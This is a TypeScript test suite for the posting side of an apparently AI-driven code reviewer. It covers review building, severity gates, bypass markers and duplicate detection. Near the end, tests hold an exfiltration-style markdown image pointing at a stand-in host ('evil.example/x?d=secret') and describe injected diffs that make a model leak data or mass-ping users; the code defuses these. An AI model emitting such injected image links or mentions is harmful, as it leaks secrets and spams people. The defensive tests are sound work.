/**
 * NDJSON in, one review out.
 *
 * The shape of a review is decided here, with no token, no network and no
 * model -- which is what makes the posting half reviewable at all. What a
 * hosting system then does with it is `providers/repository/github`'s test.
 */

import { describe, expect, it } from "bun:test";

import { type SummaryRecord } from "../../../src/core/ports/review-reporter";
import {
  COMMENT_MARKER,
  type Finding,
  OVERLAP_THRESHOLD,
  type PostedComment,
  buildReview,
  isCompleteRun,
  commentBody,
  isAlreadyPosted,
  parseRecords,
  reviewEventFor,
} from "../../../src/core/posting/review-payload";

function finding(over: Partial<Finding> = {}): Finding {
  return {
    path: "src/a.ts",
    line: 12,
    start_line: null,
    anchor: "exact",
    severity: "bug",
    body: "Null check missing.",
    example: "",
    skills: [],
    ...over,
  };
}

const SUMMARY: SummaryRecord = {
  type: "summary",
  reviewer_version: "0.0.0-test",
  base: "main",
  branch: "HEAD",
  incremental: false,
  files_changed: 4,
  files_reviewed: 2,
  failed: 0,
  findings: 1,
  files_with_findings: 1,
  anchors: { exact: 1 },
  unanchored: 0,
  refuted: 0,
  capped: 0,
  mislabelled: 0,
  bypassed: 0,
  skipped: {},
  policy_changed: [],
  bypass_regions: [],
  bypass_added: [],
};

/** The record stream as the reviewer writes it. */
function ndjson(...records: unknown[]): string {
  return `${records.map((record) => JSON.stringify(record)).join("\n")}\n`;
}

describe("reading a record stream", () => {
  it("splits findings from the summary", () => {
    const records = parseRecords(ndjson({ type: "finding", ...finding() }, SUMMARY));
    expect(records.findings).toHaveLength(1);
    expect(records.summary?.base).toBe("main");
    expect(records.unreadable).toBe(0);
  });

  it("costs a bad line that line and nothing else", () => {
    // Throwing here would turn one malformed record into a review nobody
    // gets, which is the wrong trade for a reporting path.
    const text = `not json\n${JSON.stringify({ type: "finding", ...finding() })}\n{"type":"other"}\n`;
    const records = parseRecords(text);
    expect(records.findings).toHaveLength(1);
    expect(records.unreadable).toBe(2);
  });

  it("refuses a finding with no path or no body", () => {
    const records = parseRecords(
      ndjson({ type: "finding", ...finding({ path: "" }) }, { type: "finding", body: "" }),
    );
    expect(records.findings).toHaveLength(0);
    expect(records.unreadable).toBe(2);
  });

  it("does not trust a line number it was given", () => {
    // A string `line` would reach the API as one and fail the whole review.
    const records = parseRecords(
      ndjson(
        { type: "finding", ...finding(), line: "12" },
        { type: "finding", ...finding(), line: -3 },
      ),
    );
    expect(records.findings.map((f) => f.line)).toEqual([null, null]);
  });

  it("reads an empty stream as an empty run", () => {
    expect(parseRecords("")).toEqual({ findings: [], summary: null, unreadable: 0 });
  });
});

describe("building the review", () => {
  it("anchors a finding inline and keeps its skills visible", () => {
    const stream = ndjson({ type: "finding", ...finding({ skills: ["http-route"] }) });
    const review = buildReview(parseRecords(stream));
    expect(review.comments).toEqual([
      {
        path: "src/a.ts",
        line: 12,
        body: expect.stringContaining("Null check missing.") as string,
      },
    ]);
    expect(review.comments[0]?.body).toContain("skills: http-route");
  });

  it("spans a real multi-line anchor and ignores a fake one", () => {
    const span = buildReview({
      findings: [finding({ start_line: 9 })],
      summary: null,
      unreadable: 0,
    });
    expect(span.comments[0]?.start_line).toBe(9);
    // `start_line === line` is a single-line anchor spelled the long way;
    // some providers reject it outright.
    const flat = buildReview({
      findings: [finding({ start_line: 12 })],
      summary: null,
      unreadable: 0,
    });
    expect(flat.comments[0]).not.toHaveProperty("start_line");
  });

  it("lists an unanchored finding in the body instead of dropping it", () => {
    const review = buildReview({
      findings: [finding({ line: null, body: "Nowhere to point." })],
      summary: null,
      unreadable: 0,
    });
    expect(review.comments).toHaveLength(0);
    expect(review.body).toContain("could not be anchored");
    expect(review.body).toContain("Nowhere to point.");
  });

  it("caps inline comments, keeps the most severe, and names the rest", () => {
    const findings = [
      finding({ severity: "readability", line: 1 }),
      finding({ severity: "bug", line: 2 }),
      finding({ severity: "security", line: 3 }),
    ];
    const review = buildReview({ findings, summary: null, unreadable: 0 }, { maxInline: 2 });
    expect(review.comments.map((c) => c.line)).toEqual([2, 3]);
    expect(review.overflow).toBe(1);
    expect(review.body).toContain("1 further finding(s) not posted inline");
  });

  it("says plainly when nothing was found", () => {
    const review = buildReview({ findings: [], summary: SUMMARY, unreadable: 0 });
    expect(review.body).toContain("No issues found");
    expect(review.comments).toHaveLength(0);
  });

  it("says first that a run which did not finish is incomplete, and does not call it clean", () => {
    // No summary: the review job died, and the comment job reads what it left.
    const review = buildReview({ findings: [], summary: null, unreadable: 0 });
    const [heading, , note, , headline] = review.body.split("\n", 5);
    expect(heading).toBe("### Automated review");
    expect(note).toContain("**Review incomplete:** the findings file ends without a summary");
    expect(headline).toBe("No issues found in the files that were reviewed.");
    expect(review.body).not.toContain("No issues found in the reviewed files.");
  });

  it("says first how many files could not be reviewed, and repeats it in the tallies", () => {
    const review = buildReview({
      findings: [],
      summary: { ...SUMMARY, failed: 2 },
      unreadable: 0,
    });
    expect(review.body.split("\n", 3)[2]).toContain(
      "**Review incomplete:** 2 file(s) could not be reviewed",
    );
    expect(review.body).toContain("2 could not be reviewed");
  });

  it("names the bypass markers the pull request added, read off the stream, dropping malformed ones", () => {
    const records = parseRecords(
      ndjson({
        ...SUMMARY,
        bypass_added: [
          { path: "src/b.ts", line: 9, reason: "later" },
          { path: "src/a.ts", line: 3, reason: "trust me" },
          { path: "", line: 1, reason: "no path" },
          { path: "src/c.ts", line: 0, reason: "no line" },
        ],
      }),
    );
    expect(records.summary?.bypass_added).toEqual([
      { path: "src/b.ts", line: 9, reason: "later" },
      { path: "src/a.ts", line: 3, reason: "trust me" },
    ]);
    const body = buildReview(records).body;
    expect(body).toContain(
      "> **This pull request adds 2 bypass marker(s)**: `src/a.ts:3` (trust me), `src/b.ts:9` (later).",
    );
    expect(buildReview({ findings: [], summary: SUMMARY, unreadable: 0 }).body).not.toContain(
      "adds",
    );
  });

  it("reads the reviewer's version off the stream and names it in the tallies", () => {
    const records = parseRecords(ndjson({ ...SUMMARY, reviewer_version: "0.0.13" }));
    expect(records.summary?.reviewer_version).toBe("0.0.13");
    expect(buildReview(records).body).toContain("code-reviewer 0.0.13");
    const older = parseRecords(ndjson({ ...SUMMARY, reviewer_version: undefined }));
    expect(older.summary?.reviewer_version).toBe("");
    expect(buildReview(older).body).not.toContain("code-reviewer ");
  });

  it("calls a run complete only with a summary that counts no failed file", () => {
    expect(isCompleteRun({ summary: SUMMARY })).toBe(true);
    expect(isCompleteRun({ summary: { ...SUMMARY, failed: 1 } })).toBe(false);
    expect(isCompleteRun({ summary: null })).toBe(false);
  });

  it("warns first when the change edits the review policy, and names the files", () => {
    const review = buildReview({
      findings: [finding()],
      summary: { ...SUMMARY, policy_changed: [".review/config.yaml", ".review/skills/api.md"] },
      unreadable: 0,
    });
    const [heading, , headline, , warning] = review.body.split("\n", 5);
    expect(heading).toBe("### Automated review");
    expect(headline).toContain("1 finding(s)");
    expect(warning).toContain("**This pull request edits the review policy**");
    expect(warning).toContain("`.review/config.yaml`, `.review/skills/api.md`");
    expect(warning).toContain("read those files yourself");
    // The review itself is unchanged: the warning is a caveat, not a finding.
    expect(review.comments).toHaveLength(1);
    expect(review.event).toBe("comment");
  });

  it("says nothing about policy when the change leaves it alone", () => {
    const review = buildReview({ findings: [finding()], summary: SUMMARY, unreadable: 0 });
    expect(review.body).not.toContain("review policy");
  });

  it("reads policy_changed off the stream and ignores what is not a path", () => {
    const records = parseRecords(
      [JSON.stringify({ ...SUMMARY, policy_changed: [".review/config.yaml", 7, null] })].join("\n"),
    );
    expect(records.summary?.policy_changed).toEqual([".review/config.yaml"]);
    const legacy = parseRecords(JSON.stringify({ ...SUMMARY, policy_changed: undefined }));
    expect(legacy.summary?.policy_changed).toEqual([]);
  });

  it("repeats the run's tallies, including what it could not read", () => {
    const review = buildReview({
      findings: [finding()],
      summary: { ...SUMMARY, refuted: 2, capped: 3, bypassed: 4 },
      unreadable: 1,
    });
    expect(review.body).toContain("2 refuted by verification");
    expect(review.body).toContain("3 withheld by the per-file cap");
    expect(review.body).toContain("4 added line(s) in bypassed regions not reviewed");
    expect(review.body).toContain("1 unreadable record(s)");
  });

  it("names every bypassed region with its reason, sorted, after the policy warning", () => {
    const review = buildReview({
      findings: [finding()],
      summary: {
        ...SUMMARY,
        policy_changed: [".review/config.yaml"],
        bypass_regions: [
          { path: "src/b.ts", start_line: 3, end_line: 3, reason: "one line" },
          { path: "src/a.ts", start_line: 41, end_line: 80, reason: "legacy" },
        ],
      },
      unreadable: 0,
    });
    const lines = review.body.split("\n", 7);
    const policy = lines[4];
    const bypass = lines[6];
    expect(policy).toContain("edits the review policy");
    expect(bypass).toBe(
      "> **Review was bypassed by markers in the code** in 2 region(s): `src/a.ts:41-80` (legacy), `src/b.ts:3` (one line). A bypass is the author's call, not the reviewer's, so read those yourself.",
    );
    // A caveat, not a finding: the review itself is unchanged.
    expect(review.comments).toHaveLength(1);
  });

  it("does not repeat a finding an earlier review already placed, and counts it", () => {
    const records = parseRecords(
      ndjson(
        { type: "finding", ...finding({ line: 12 }) },
        { type: "finding", ...finding({ line: 40, body: "Second." }) },
        SUMMARY,
      ),
    );
    const review = buildReview(records, {
      posted: [{ path: "src/a.ts", line: 12, start_line: null }],
    });
    expect(review.comments.map((c) => c.line)).toEqual([40]);
    expect(review.alreadyPosted).toBe(1);
    expect(review.overflow).toBe(0);
    expect(review.body).toContain("1 already posted inline by an earlier review and not repeated");
    // The repeated finding is still a finding: the headline and the verdict count it.
    expect(review.body).toContain("**2 finding(s)**");
    expect(buildReview(records, { posted: [], requestChangesOn: ["bug"] }).event).toBe(
      "request-changes",
    );
    expect(
      buildReview(records, {
        posted: [{ path: "src/a.ts", line: 12, start_line: null }],
        requestChangesOn: ["bug"],
      }).event,
    ).toBe("request-changes");
  });

  it("gives the inline cap's slots to findings not yet posted", () => {
    const records = parseRecords(
      ndjson(
        { type: "finding", ...finding({ line: 12 }) },
        { type: "finding", ...finding({ line: 40, body: "Second." }) },
      ),
    );
    const review = buildReview(records, {
      maxInline: 1,
      posted: [{ path: "src/a.ts", line: 12, start_line: null }],
    });
    expect(review.comments.map((c) => c.line)).toEqual([40]);
    expect(review.overflow).toBe(0);
    expect(review.alreadyPosted).toBe(1);
  });

  it("posts everything, and says nothing about repeats, when nothing was posted before", () => {
    const records = parseRecords(ndjson({ type: "finding", ...finding() }));
    const review = buildReview(records);
    expect(review.alreadyPosted).toBe(0);
    expect(review.body).not.toContain("already posted");
  });

  it("says first when the run was incremental, and reads the flag off the stream", () => {
    const review = buildReview({
      findings: [finding()],
      summary: { ...SUMMARY, incremental: true, base: "abc123" },
      unreadable: 0,
    });
    expect(review.body.split("\n", 5)[4]).toBe(
      "> **Only the commits since `abc123` were reviewed; findings earlier runs reported on this change still stand.**",
    );
    expect(buildReview({ findings: [], summary: SUMMARY, unreadable: 0 }).body).not.toContain(
      "Only the commits",
    );
    expect(
      parseRecords(JSON.stringify({ ...SUMMARY, incremental: true })).summary?.incremental,
    ).toBe(true);
    expect(
      parseRecords(JSON.stringify({ ...SUMMARY, incremental: "yes" })).summary?.incremental,
    ).toBe(false);
    expect(
      parseRecords(JSON.stringify({ ...SUMMARY, incremental: undefined })).summary?.incremental,
    ).toBe(false);
  });

  it("says nothing about bypassing when no region was bypassed", () => {
    const review = buildReview({ findings: [finding()], summary: SUMMARY, unreadable: 0 });
    expect(review.body).not.toContain("bypass");
  });

  it("reads bypassed and bypass_regions off the stream, dropping malformed regions", () => {
    const records = parseRecords(
      JSON.stringify({
        ...SUMMARY,
        bypassed: 3,
        bypass_regions: [
          { path: "src/a.ts", start_line: 41, end_line: 80, reason: "legacy" },
          { path: "src/a.ts", start_line: 5, end_line: 5 },
          { path: "", start_line: 1, end_line: 2, reason: "no path" },
          { path: "src/c.ts", start_line: 9, end_line: 4, reason: "ends before it starts" },
          { path: "src/d.ts", start_line: "7", end_line: 8, reason: "string line" },
          "not an object",
          null,
        ],
      }),
    );
    expect(records.summary?.bypassed).toBe(3);
    expect(records.summary?.bypass_regions).toEqual([
      { path: "src/a.ts", start_line: 41, end_line: 80, reason: "legacy" },
      { path: "src/a.ts", start_line: 5, end_line: 5, reason: "" },
    ]);
    const legacy = parseRecords(
      JSON.stringify({ ...SUMMARY, bypassed: undefined, bypass_regions: undefined }),
    );
    expect(legacy.summary?.bypassed).toBe(0);
    expect(legacy.summary?.bypass_regions).toEqual([]);
  });

  it("posts a comment unless a finding's severity is in the gate", () => {
    const records = parseRecords(
      ndjson(
        { type: "finding", ...finding({ severity: "bug" }) },
        { type: "finding", ...finding({ severity: "readability", line: 20 }) },
      ),
    );
    // No gate: the review informs, the humans decide.
    expect(buildReview(records).event).toBe("comment");
    expect(buildReview(records, { requestChangesOn: [] }).event).toBe("comment");
    // A gate the findings do not meet.
    expect(buildReview(records, { requestChangesOn: ["security"] }).event).toBe("comment");
    // A gate they do; spelled however the caller spelled it.
    expect(buildReview(records, { requestChangesOn: ["Bug"] }).event).toBe("request-changes");
    expect(buildReview(records, { requestChangesOn: ["security", "bug"] }).event).toBe(
      "request-changes",
    );
  });

  it("asks for nothing when nothing was found, whatever the gate", () => {
    expect(reviewEventFor([], ["bug", "security"])).toBe("comment");
  });

  it("meets the gate however the record spelled the severity", () => {
    // The gate is validated (`severityList`), so it is canonical; a severity
    // read off a record stream is not. A gate that read `"Bug"` as something
    // other than `bug` would fail open -- posting a comment where the
    // operator asked for a block.
    for (const spelling of ["bug", "Bug", "BUG", " bug "]) {
      const records = parseRecords(ndjson({ type: "finding", ...finding({ severity: spelling }) }));
      expect(reviewEventFor(records.findings, ["bug"])).toBe("request-changes");
      expect(buildReview(records, { requestChangesOn: ["bug"] }).event).toBe("request-changes");
    }
  });

  it("does not let an unknown severity trip a gate it does not name", () => {
    const records = parseRecords(ndjson({ type: "finding", ...finding({ severity: "typo" }) }));
    expect(reviewEventFor(records.findings, ["bug", "security"])).toBe("comment");
  });

  it("offers the example as a plain fence, never a one-click suggestion", () => {
    // A ```suggestion would let someone commit text nobody checked against
    // the surrounding lines.
    const body = commentBody(finding({ example: "if (x == null) return;" }));
    expect(body).toContain("```\nif (x == null) return;\n```");
    expect(body).not.toContain("```suggestion");
  });

  it("fences an example that carries backticks of its own with a longer fence", () => {
    const body = commentBody(finding({ example: "const s = ```not a fence```;" }));
    expect(body).toContain("````\nconst s = ```not a fence```;\n````");
  });

  it("turns an image in a model's text into a link, so reading the comment fetches nothing", () => {
    // The model read untrusted diff text; an injected image could carry what it was shown out in a URL.
    const body = commentBody(
      finding({ body: "See ![logo](https://evil.example/x?d=secret) and <img src=x>." }),
    );
    expect(body).toContain("See [logo](https://evil.example/x?d=secret) and &lt;img src=x>.");
    expect(body).not.toContain("![");
    const review = buildReview({
      findings: [finding({ line: null, body: "![a](https://evil.example/p)" })],
      summary: SUMMARY,
      unreadable: 0,
    });
    expect(review.body).toContain("[a](https://evil.example/p)");
    expect(review.body).not.toContain("![a]");
  });

  it("turns a mention in a model's text into code, so the comment notifies nobody", () => {
    // A decorator the model names without backticks would otherwise ping a user of that name, and an
    // injected diff could have it ping a whole team.
    const body = commentBody(
      finding({
        body: "Ping @octocat and @acme/security; `@Injectable` stays; mail a@b.com; @Component() too.",
      }),
    );
    expect(body).toContain(
      "Ping `@octocat` and `@acme/security`; `@Injectable` stays; mail a@b.com; `@Component`() too.",
    );
  });

  it("signs every inline comment with an invisible marker, last", () => {
    expect(COMMENT_MARKER).toMatch(/^<!--.*-->$/u);
    expect(commentBody(finding())).toEndWith(`\n\n${COMMENT_MARKER}`);
    expect(commentBody(finding({ skills: ["a"], example: "x" }))).toEndWith(COMMENT_MARKER);
  });
});

/** A posted comment on `src/a.ts`. */
function posted(line: number | null, start_line: number | null = null): PostedComment {
  return { path: "src/a.ts", line, start_line };
}

/** An anchored finding on `src/a.ts`. */
function anchored(line: number, start_line: number | null = null): Finding & { line: number } {
  return { ...finding({ line, start_line }), line };
}

describe("what an earlier review already put on the pull request", () => {
  it("matches a single-line comment on the same line of the same path, and nothing else", () => {
    expect(isAlreadyPosted(anchored(12), [posted(12)])).toBe(true);
    expect(isAlreadyPosted(anchored(12), [posted(13)])).toBe(false);
    expect(isAlreadyPosted(anchored(12), [{ ...posted(12), path: "src/b.ts" }])).toBe(false);
    expect(isAlreadyPosted(anchored(12), [])).toBe(false);
  });

  it("never matches a comment the host has marked outdated: its code is gone", () => {
    expect(isAlreadyPosted(anchored(12), [posted(null)])).toBe(false);
    expect(isAlreadyPosted(anchored(12, 10), [posted(null, null)])).toBe(false);
  });

  it("never matches a single-line comment against a multi-line one, either way round", () => {
    expect(isAlreadyPosted(anchored(12), [posted(14, 10)])).toBe(false);
    expect(isAlreadyPosted(anchored(14, 10), [posted(12)])).toBe(false);
  });

  it("matches two ranges when they overlap by more than the threshold, and not at it", () => {
    expect(OVERLAP_THRESHOLD).toBe(0.6);
    // 10-20 vs 10-16: overlap 7 of a union of 11 = 0.636.
    expect(isAlreadyPosted(anchored(20, 10), [posted(16, 10)])).toBe(true);
    // 10-20 vs 10-15: overlap 6 of 11 = 0.545.
    expect(isAlreadyPosted(anchored(20, 10), [posted(15, 10)])).toBe(false);
    // 1-5 vs 1-3: overlap 3 of 5 = 0.6 exactly, which is not "more than".
    expect(isAlreadyPosted(anchored(5, 1), [posted(3, 1)])).toBe(false);
    // Disjoint ranges.
    expect(isAlreadyPosted(anchored(20, 10), [posted(30, 21)])).toBe(false);
  });

  it("reads a range whichever way round the host spelled it", () => {
    expect(isAlreadyPosted(anchored(20, 10), [posted(10, 20)])).toBe(true);
    expect(isAlreadyPosted(anchored(10, 20), [posted(20, 10)])).toBe(true);
  });

  it("treats start_line equal to line as a single line", () => {
    expect(isAlreadyPosted(anchored(12, 12), [posted(12)])).toBe(true);
    expect(isAlreadyPosted(anchored(12), [posted(12, 12)])).toBe(true);
  });
});
